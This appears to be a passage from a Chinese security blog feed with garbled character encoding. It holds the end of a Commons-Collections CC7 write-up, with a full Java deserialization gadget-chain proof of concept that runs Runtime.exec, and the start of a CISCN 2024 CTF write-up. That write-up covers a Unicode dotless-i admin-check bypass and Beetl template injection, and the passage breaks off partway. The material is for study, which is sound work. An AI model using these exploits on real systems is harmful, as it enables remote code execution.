class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>    ChainedTransformer#transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> getChainedTransformer();<br><br>            Map&lt;String, Integer&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            Map&lt;String, Integer&gt; hashMap2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>            Map&lt;String, Integer&gt; map1 = LazyMap.decorate(hashMap1, chain);<br>            map1.put(<span class="hljs-string">&quot;00&quot;</span>, <span class="hljs-number">1</span>);<br>            Map&lt;String, Integer&gt; map2 = LazyMap.decorate(hashMap2, chain);<br>            map2.put(<span class="hljs-string">&quot;.n&quot;</span>, <span class="hljs-number">1</span>);<br>            Hashtable&lt;Map&lt;String, Integer&gt;, Integer&gt; hashtable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>            hashtable.put(map1, <span class="hljs-number">1</span>);<br>            hashtable.put(map2, <span class="hljs-number">1</span>);<br>            map2.remove(<span class="hljs-string">&quot;00&quot;</span>);<br>            deserialize(serialize(hashtable));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> ChainedTransformer <span class="hljs-title function_">getChainedTransformer</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">ct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class);<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it_exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        );<br>        Transformer[] a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;ct, it1, it2, it_exec&#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(a);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>             <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos)) &#123;<br>            oos.writeObject(obj);<br>            <span class="hljs-keyword">return</span> baos.toByteArray();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes))) &#123;<br>            ois.readObject();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728232439088.png" alt="image-20240728232439088"></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><img src="/2024/07/28/Commons-Collections/image-20240728233307715.png" class="" title="image-20240728233307715"><p>ç”±æ­¤CCé“¾å‘Šä¸€æ®µè½ï¼ŒCBé“¾éšç¼˜å†è®²å§ã€‚</p><p>çœ‹å®ŒCCé“¾åªèƒ½è¯´ååºåˆ—åŒ–åˆæ­¥å…¥é—¨ï¼Œå®æˆ˜è°ƒé“¾å­ä¹Ÿä¼šåç»­ä¸€æ­¥æ­¥å†™ä¸Šçš„ã€‚</p><p>æˆ‘ä¸€å®šè¦æˆä¸ºJavaé«˜æ‰‹ï¼ï¼ï¼ï¼</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/commons-collection/">https://p4d0rn.gitbook.io/java/serial-journey/commons-collection/</a></p><p><a href="https://wx.zsxq.com/dweb2/index/tags/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/551511412514">https://wx.zsxq.com/dweb2/index/tags/Javaå®‰å…¨æ¼«è°ˆ/551511412514</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/125631391">Javawebå®‰å…¨â€”â€”ååºåˆ—åŒ–æ¼æ´-commons-collections4åˆ©ç”¨é“¾ï¼ˆCC2å’ŒCC4ï¼‰-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/127580121?ops_request_misc=%7B%22request_id%22:%22172217921116800225595414%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172217921116800225595414&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-127580121-null-null.nonecase&utm_term=CC5">Javawebå®‰å…¨â€”â€”ååºåˆ—åŒ–æ¼æ´-CC&amp;CBé“¾æ€è·¯æ•´ç†-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/16141397.html#commonscollections5">Javaååºåˆ—åŒ–ä»URLDNSåˆ°CommonsCollections1-7 - KingBridge - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2024-Final-AWDP-Fobee</title>
    <link href="/2024/07/28/CISCN2024-Final-AWDP-Fobee/"/>
    <url>/2024/07/28/CISCN2024-Final-AWDP-Fobee/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡å›½èµ›ç®—æ˜¯çˆ†ç§äº†ï¼Œæ‹¿ä¸‹äº†å…¨å›½æ€»å† å†›ã€‚</p><p><a href="https://mp.weixin.qq.com/s/HEdvNGKRnd0XBJwR8zAi4Q">å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004124171.png" alt="image-20240728004124171"></p><p>ç®—æ˜¯è®©å¤©æ¢åç»§æœ‰äººäº†å§ã€‚</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004719598.png" alt="image-20240728004719598"></p><p>ï¼ˆé¢†å¥–çš„é‚£ä½æ˜¯æˆ‘hhhhhï¼Œåœ¨å·¦äºŒæŒ¨ç€å·å¤§ç½‘å®‰é™¢é™¢é•¿ï¼‰</p><p>ä¸»è¦è¿˜æ˜¯ç¬¬äºŒå¤©çš„æ¸—é€æ¯”è¾ƒé€‚åˆæˆ‘å§å“ˆå“ˆï¼Œå¤©æ—¶åœ°åˆ©äººå’Œï¼Œé˜Ÿå‹ä¹Ÿå¾ˆç»™åŠ›ï¼Œæœ€åç›´æ¥ä¸€é¼“ä½œæ°”å†²åˆ°äº†æ¦œé¦–ğŸ˜€</p><p>æ¸—é€çš„wpä¸æ‰“ç®—å†™ï¼Œåæ­£ç½‘ä¸Šä¹Ÿæœ‰æ‰“çš„æ¯”æˆ‘å¤šä¸€é“é¢˜çš„å†™äº†wpï¼Œæˆ‘ä»¬æ¸—é€æ˜¯å¹¶åˆ—ç¬¬äºŒï¼Œæ®è¯´äº‘é•œä¼šä¸Šï¼Œåˆ°æ—¶å€™å†çœ‹çœ‹èƒ½ä¸èƒ½å†²ä¸‹DCäº†å´å½“æ—¶çš„é—æ†¾ã€‚</p><p>ç¬¬ä¸€å¤©çš„awdpçš„webï¼Œæˆ‘å°±ä¿®äº†ä¸€ä¸ªsolon-masterï¼Œé‚£é“çš„fixå¾ˆç®€å•ï¼Œå› ä¸ºlibé‡Œå¯ä»¥å‘ç°snakeyamlå’Œlogbackï¼Œç›´æ¥æŠŠå…³é”®å­—snakeå’Œlogç»™banæ‰å°±å¯ä»¥äº†ï¼Œç„¶åæˆ‘è¿‡æ»¤å¾—æ›´ç‹ ï¼Œç›´æ¥ä»€ä¹ˆ@ã€$ã€&lt; è¿™äº›å¸¸è§æ‰“jsonæ ¼å¼çš„ååºåˆ—åŒ–ç¬¦å·ç»™banäº†ï¼Œæ‰€ä»¥æ„å¤–çš„ç¬¬ä¸‰è½®å°±æ‹¿ä¸‹äº†fixï¼Œå¹¶åˆ—äºŒè¡€fixå§ç®—ï¼Œè¿‘ä¹æ˜¯åƒæ»¡äº†checkğŸ¤­ğŸ¤­ğŸ¤­</p><p>å”¯ç‹¬è¿™ä¸ªFobeeè®©æˆ‘å¤´ç–¼ï¼Œå½“æ—¶æˆ‘å‡ ä¹åé¢å‡ ä¸ªå°æ—¶éƒ½åœ¨çœ‹è¿™ä¸ªï¼Œç„¶è€Œä¿®å‡ºæ¥çš„ä¹Ÿåªæœ‰å‡ ä¸ªé˜Ÿï¼Œæ‰“å‡ºæ¥çš„ä¹Ÿä¸è¿‡ä¸‰ä¸ªæ•°ã€‚</p><p>å…¶ä¸­ä¸€ä¸ªæ‰“æ³•æ˜¯å­¦é•¿ç»™çš„ï¼Œè¿™é‡Œåšä¸€ä¸‹æµ…æµ…çš„å¤ç°ï¼ˆå­¦é•¿tqlå‘œå‘œå‘œå‘œï¼‰</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é¦–å…ˆæ˜¯çœ‹çœ‹ä»£ç é€»è¾‘ï¼š</p><p><strong>IndexController.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fobee;<br><br><span class="hljs-keyword">import</span> java.security.MessageDigest;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> org.beetl.core.BeetlKit;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Controller;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Mapping;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.ModelAndView;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CHARACTERS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> generateRandomString(<span class="hljs-number">10</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">index</span><span class="hljs-params">(String username)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;index.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;=====&quot;</span> + password + <span class="hljs-string">&quot;=====&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/render&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">render</span><span class="hljs-params">(String pass, String tp)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;render.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pass != <span class="hljs-literal">null</span> &amp;&amp; pass.equals(password)) &#123;<br>            <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br>            System.out.println(result);<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, getMD5Hash(result));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;Render Page&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> model;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/env&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">env</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateRandomString</span><span class="hljs-params">(<span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(length);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> random.nextInt(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.length());<br>            sb.append(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.charAt(index));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getMD5Hash</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException &#123;<br>        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>        md.update(input.getBytes());<br>        <span class="hljs-type">byte</span>[] digest = md.digest();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-type">byte</span>[] var4 = digest;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> digest.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> var4[var6];<br>            sb.append(String.format(<span class="hljs-string">&quot;%02x&quot;</span>, b &amp; <span class="hljs-number">255</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™å‡ ä¸ªè·¯ç”±åŸºæœ¬ä¸€ç›®äº†ç„¶ï¼Œé¦–å…ˆæ˜¯è¦çŸ¥é“è¿™ä¸ªModelAndViewçš„é»˜è®¤ä¼ å‚æ˜¯GETï¼Œä¼ å‚éƒ½æä¸æ˜ç™½åŸºæœ¬å¯ä»¥å‘Šåˆ«äº†ã€‚</p><p>é¦–å…ˆè¿›å»çš„æ ¹è·¯ç”±æ˜¯éœ€è¦ä½ ä¼ å‚usernameï¼Œä½†æ˜¯è¦æ»¡è¶³ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)<br></code></pre></td></tr></table></figure><p>æœ¬æ¥fixæˆ‘æ˜¯æƒ³ä¸‹é¢ååºåˆ—åŒ–ä¿®ä¸åŠ¨ï¼Œåœ¨è¿™é‡Œè¿‡æ»¤ç‹ ä¸€ç‚¹ï¼Œä½†æ˜¯å½“ç„¶ä¹Ÿæ˜¯checkä¸è¿‡ã€‚</p><p>å®ƒåˆè¦ä½ æ˜¯adminï¼Œåˆè¦ä½ toLowerCaseç»•è¿‡ä¸æ˜¯adminï¼Œé‚£æ€ä¹ˆç»•ï¼Ÿï¼Ÿï¼Ÿ</p><p>å…¶å®ä½ æ‰“å¼€IDEAï¼Œæ‹–è¿‡å»åˆ°toLowerCaseï¼Œå®ƒè‡ªå·±å°±å‘Šè¯‰ä½ äº†ï¼š</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728001510929.png" alt="image-20240728001510929"></p><p>è¿™ä¸ªlocaleçš„ä¸ä¸€è‡´ä¼šå¯¼è‡´ä¸€ä¸ªå­—ç¬¦æœ‰å¤šç§è¯†åˆ«æ–¹å¼ï¼Œè¿™é‡Œå°±å‘Šè¯‰ä½ äº† <strong>i</strong> åœ¨LATIN SMALL LETTERé‡ç­‰æ•ˆäº <strong>\u0131</strong> ,å…¶å®ä¸éœ€è¦æ·±å…¥ç†è§£ï¼Œè¿™é‡Œå°±èƒ½ç»•äº†ï¼Œè¿›å»åå°±èƒ½é‚£é“passwordçš„å›æ˜¾ã€‚</p><p>æˆ‘ä»¬æ¥ç€çœ‹è·¯ç”±ï¼Œä¸‹é¢çš„renderè·¯ç”±ï¼Œå¾ˆå®¹æ˜“çœ‹åˆ°attackçš„ç‚¹åœ¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯base64è§£å¯†ä¼ å‚çš„tpï¼Œç„¶åè°ƒç”¨åˆ°BeetlKit.renderè¿›è¡Œæ¸²æŸ“ï¼Œå…¶å®åº”è¯¥å°±æ˜¯ä¸ªSSTIã€‚</p><p>ä½†æ˜¯è¿›å…¥è¿™é‡Œéœ€è¦passwordï¼Œè€Œä¸Šé¢è‹¥ç»•è¿›å»äº†å°±æ‹¿åˆ°äº†passwordï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šå°±å®Œæˆäº†ã€‚</p><p>æ€ä¹ˆæ‰“SSTIå‘¢ï¼Œæˆ‘ä»¬è§£åŒ…ä¸€ä¸‹è¿™ä¸ªBeetlKitè·Ÿè¿›ä¸€ä¸‹ï¼š</p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002111368.png" class="" title="image-20240728002111368"><p>ä¸€ä¸ªæ‰“æ¨¡æ¿æ³¨å…¥çš„åœ°æ–¹ã€‚</p><p>ç„¶è€Œå¥½åƒæ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œçœ‹ä¸å‡ºæ¥ä»–è¦å¹²å•¥ï¼Œå…·ä½“åŸç†è¿™é‡Œæœ‰ç¯‡æ–‡ç« å¯ä»¥çœ‹çœ‹ï¼š</p><p><a href="https://xz.aliyun.com/t/8695?time__1311=n4+xnD0DcDu7G=DCzGkDlhje3iKt4Y5feeEd4x">ä¸€æ¬¡æ„å¤–çš„ä»£ç å®¡è®¡â€”-JfinalCMSå®¡è®¡ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002358967.png" alt="image-20240728002358967"></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002405853.png" alt="image-20240728002405853"></p><p>è¿™ä¸‹SSTIä¼šæ‰“äº†ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥å£å®ç°æ¶æ„ç±»åŠ è½½ï¼Œä½†æ˜¯beetlKitè¿‡æ»¤å¾—æœ‰ç‚¹ç‹ ï¼Œå¸¸è§„çš„ç›´æ¥æ‰“runtimeè¡Œä¸é€šã€‚</p><p>æ‰€ä»¥éœ€è¦æ‰¾åˆ°å®ƒå†…éƒ¨ä»€ä¹ˆç©æ„èƒ½è°ƒç”¨runtimeæ‰“æˆåŠŸï¼Œå­¦é•¿æ‰¾åˆ°äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.antlr.v4.runtime.misc.Utils.readFile<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002829857.png" 